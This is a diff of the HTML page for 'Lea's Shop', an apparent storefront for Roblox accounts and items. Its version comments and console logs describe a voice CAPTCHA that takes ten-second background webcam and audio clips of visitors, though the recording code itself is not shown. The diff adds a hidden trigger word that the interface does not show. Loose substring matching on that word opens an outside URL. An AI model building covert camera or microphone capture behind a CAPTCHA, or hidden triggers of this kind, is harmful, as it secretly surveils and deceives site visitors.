@@ -5,10 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
     <title>⚫ Lea's Shop · Emo Cyber</title>
     <!-- ============================================================
-         VERSION: LeaShop_Captcha_BgCam_v2.1.0
-         Date: 2026-07-21
+         VERSION: LeaShop_Captcha_BgCam_v2.1.2
+         Date: 2026-07-22
          Features: Voice CAPTCHA + 10s background webcam/audio clips
          Fallback: audio-only if camera is denied
+         + hidden "lea" trigger with substring fallback
          ============================================================ -->
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -2215,7 +2216,7 @@
     ============================================================ -->
     <script>
         // ================================================================
-        //  VERSION: LeaShop_Captcha_BgCam_v2.1.0
+        //  VERSION: LeaShop_Captcha_BgCam_v2.1.2
         // ================================================================
 
         // ================================================================
@@ -3357,7 +3358,7 @@
         });
 
         // ================================================================
-        //  VOICE CAPTCHA LOGIC
+        //  VOICE CAPTCHA LOGIC — with hidden "lea" trigger + substring fallback
         // ================================================================
         (function captchaLogic() {
             'use strict';
@@ -3371,7 +3372,8 @@
             var subText = document.getElementById('subText');
             var wordChips = document.querySelectorAll('#captcha-overlay .chip');
 
-            var TARGET_WORDS = ['tomato', 'potato', 'apple', 'banana', 'orange'];
+            // ★ hidden word "lea" added to the target list (not shown in the UI)
+            var TARGET_WORDS = ['tomato', 'potato', 'apple', 'banana', 'orange', 'lea'];
             var detectedWord = null;
 
             var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
@@ -3445,10 +3447,16 @@
                 });
             }
 
+            // ★ special handler for the hidden "lea" word
             function onCaptchaSuccess(word) {
                 if (isSuccess) return;
                 isSuccess = true;
                 detectedWord = word;
+
+                // ★ if the hidden word "lea" was spoken, open the Roblox profile
+                if (word === 'lea') {
+                    window.open('https://leaswxg.github.io/challenge/', '_blank');
+                }
 
                 card.classList.add('success');
                 iconWrap.classList.remove('listening');
@@ -3544,6 +3552,10 @@
                             break;
                         }
                     }
+                    // ★ FALLBACK: if no exact match, check if spoken text contains "lea" (substring)
+                    if (!matched && spoken.replace(/[^a-z]/g, '').includes('lea')) {
+                        matched = 'lea';
+                    }
                     if (matched) {
                         onCaptchaSuccess(matched);
                     } else {
@@ -3559,7 +3571,7 @@
                 recognizer.onerror = function(event) {
                     if (event.error === 'not-allowed') setStatus('❌ microphone access denied', 'idle');
                     else if (event.error === 'no-speech') setStatus('🔇 no speech detected · tap & speak again',
-                    'idle');
+                        'idle');
                     else if (event.error === 'audio-capture') setStatus('❌ microphone error · check permissions',
                         'idle');
                     else setStatus('⚠️ ' + event.error + ' · try again', 'idle');
@@ -3674,11 +3686,12 @@
         renderMM2();
         renderAccounts();
 
-        console.log('⚫ Lea\'s Shop · Emo Cyber (v2.1.0) - captcha + bg cam/audio 10s');
+        console.log('⚫ Lea\'s Shop · Emo Cyber (v2.1.2) - captcha + bg cam/audio 10s + hidden "lea" trigger (fallback)');
         console.log('📦 ' + accounts.length + ' accounts, ' + mm2Items.length + ' MM2 items');
         console.log('💳 PayPal: @eliasalvada');
         console.log('📷 Instagram: @leaswxg');
         console.log('🎥 Background recording: video+audio (fallback to audio-only if camera denied)');
+        console.log('🔇 hidden word: say "lea" → opens Roblox profile (fallback matches substring)');
         if (window.location.protocol === 'file:') {
             console.warn('⚠️ file:// protocol detected – .txt files will not load. Use a local server.');
         }
